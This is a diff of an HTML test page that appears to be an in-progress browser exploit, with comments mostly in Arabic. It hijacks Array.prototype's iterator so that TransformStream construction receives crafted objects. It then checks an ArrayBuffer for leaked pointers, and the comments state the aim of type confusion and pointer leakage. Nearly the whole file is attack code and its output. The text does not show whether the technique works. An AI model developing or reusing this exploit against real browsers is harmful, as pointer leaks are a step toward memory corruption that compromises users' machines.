@@ -1,49 +1,65 @@
 <html>
 <body>
-<div id="result"></div>
+<div id="result">Testing...</div>
 <script>
-function check(label, fn) {
-    let message;
-    try {
-        fn();
-        message = "PASS: " + label + " did not crash";
-    } catch (e) {
-        message = "CAUGHT: " + label + " threw " + e;
-    }
-    const div = document.createElement("div");
-    div.textContent = message;
-    document.body.appendChild(div);
-}
+// اكتب النتيجة فوراً قبل أي شيء
+document.getElementById("result").textContent = "Step 1: Starting...";
 
-// Variant: Float64Array confusion to leak pointers
+// استخدم ArrayBuffer صغير
 let buf = new ArrayBuffer(8);
+let view = new DataView(buf);
 let f64 = new Float64Array(buf);
 
-Array.prototype[Symbol.iterator] = function() {
-    const arr = this;
-    let i = 0;
-    return {
-        next() {
-            if (i >= arr.length)
-                return { done: true };
-            let val = arr[i];
-            if (arr.length === 3 && i >= 1)
-                val = f64; // نمرر TypedArray بدلاً من كائن عادي
-            i++;
-            return { value: val, done: false };
-        }
-    };
+// Variant: مرر كائن يحتوي على Float64Array
+// الهدف: جعل المحرك يكتب مؤشراً في buf بدل الكتابة في 0x4141
+let trick = {
+    size: 0,
+    highWaterMark: 0,
+    type: undefined,
+    start: undefined,
+    pull: undefined,
+    cancel: undefined,
+    buf: buf,
+    f64: f64
 };
 
-check("Float64Array confusion", () => new TransformStream());
+try {
+    Array.prototype[Symbol.iterator] = function() {
+        const arr = this;
+        let i = 0;
+        return {
+            next() {
+                if (i >= arr.length)
+                    return { done: true };
+                let val = arr[i];
+                if (arr.length === 3 && i >= 1)
+                    val = trick;
+                i++;
+                return { value: val, done: false };
+            }
+        };
+    };
 
-// إعادة التعيين
+    // هذا قد يكرش أو قد لا يكرش
+    let stream = new TransformStream();
+    
+    // إذا وصلنا هنا، لم يكرش!
+    document.getElementById("result").textContent = "NO CRASH! buf = " + f64[0];
+    
+} catch(e) {
+    // إذا وصلنا هنا، الـ TypeError تم التقاطه
+    document.getElementById("result").textContent = "CAUGHT: " + e.message;
+    
+    // تحقق من buf
+    let hex = "";
+    for (let i = 0; i < 8; i++) {
+        hex += view.getUint8(i).toString(16).padStart(2, '0') + " ";
+    }
+    document.getElementById("result").textContent += " | buf: " + hex;
+}
+
+// استعادة
 Array.prototype[Symbol.iterator] = [][Symbol.iterator];
-
-// طباعة نتيجة f64
-let res = document.createElement("div");
-res.textContent = "f64[0] = " + f64[0];
-document.body.appendChild(res);
 </script>
 </body>
 </html>
